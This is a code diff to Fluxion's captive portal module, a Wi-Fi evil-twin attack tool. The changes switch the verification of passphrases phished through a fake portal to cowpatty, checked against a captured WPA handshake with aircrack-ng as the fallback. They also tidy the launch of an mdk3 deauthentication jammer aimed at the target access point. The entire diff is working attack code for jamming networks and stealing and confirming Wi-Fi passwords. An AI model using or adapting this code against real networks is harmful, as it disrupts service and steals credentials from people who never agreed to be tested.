@@ -917,20 +917,37 @@ while [ \$AuthenticatorState = \"running\" ]; do
 " >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
   if [ $CaptivePortalAuthenticatorMode = "hash" ]; then
-    echo "
-    if [ -f \"$FLUXIONWorkspacePath/candidate_result.txt\" ]; then
-        # Check if we've got the correct password by looking for anything other than \"Passphrase not in\".
-        if ! aircrack-ng -b $FluxionTargetMAC -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$CaptivePortalHashPath\" | grep -qi \"Passphrase not in\"; then
-            echo \"2\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
+    # 05/26/19: Default to cowpatty for verification since aircrack-ng appears to have a bug.
+    if which cowpatty &> /dev/null; then
+      echo "
+      if [ -f \"$FLUXIONWorkspacePath/candidate_result.txt\" ]; then
+          if cowpatty -f \"$FLUXIONWorkspacePath/candidate.txt\" -r \"$CaptivePortalHashPath\" -s \"$FluxionTargetSSID\" &> /dev/null; then
+              echo \"2\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
 
-            sleep 1
-            break
+              sleep 1
+              break
 
-        else
-            echo \"1\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
+          else
+              echo \"1\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
 
-        fi
-    fi" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+          fi
+      fi" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+    else
+      echo "
+      if [ -f \"$FLUXIONWorkspacePath/candidate_result.txt\" ]; then
+          # Check if we've got the correct password by looking for anything other than \"Passphrase not in\" or \"KEY NOT FOUND\".
+          if ! aircrack-ng -b $FluxionTargetMAC -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$CaptivePortalHashPath\" | egrep -qi \"Passphrase not in|KEY NOT FOUND\"; then
+              echo \"2\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
+
+              sleep 1
+              break
+
+          else
+              echo \"1\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
+
+          fi
+      fi" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+    fi
   fi
 
   local -r staticSSID=$(printf "%q" "$FluxionTargetSSID" | sed -r 's/\\\ / /g' | sed -r "s/\\\'/\'/g")
@@ -1005,9 +1022,12 @@ IP: $(captive_portal_get_client_IP)
 \" >\"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log\"" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
   if [ $CaptivePortalAuthenticatorMode = "hash" ]; then
+#    echo "
+# aircrack-ng -a 2 -b $FluxionTargetMAC -0 -s \"$CaptivePortalHashPath\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log"$CClr"\"\
+#" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
     echo "
-aircrack-ng -a 2 -b $FluxionTargetMAC -0 -s \"$CaptivePortalHashPath\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log"$CClr"\"\
-" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+    echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log"$CClr"\"\
+      " >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
   fi
 
   chmod +x "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
@@ -1500,11 +1520,13 @@ start_attack() {
     # Save parent's pid, to get to child later.
     CaptivePortalJammerServiceXtermPID=$!
   else
-    xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
+
+	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
         "mdk3 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
-    # Save parent's pid, to get to child later.
-    CaptivePortalJammerServiceXtermPID=$!
+        # Save parent's pid, to get to child later.
+    	CaptivePortalJammerServiceXtermPID=$!
+
   fi
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingAuthenticatorServiceNotice"
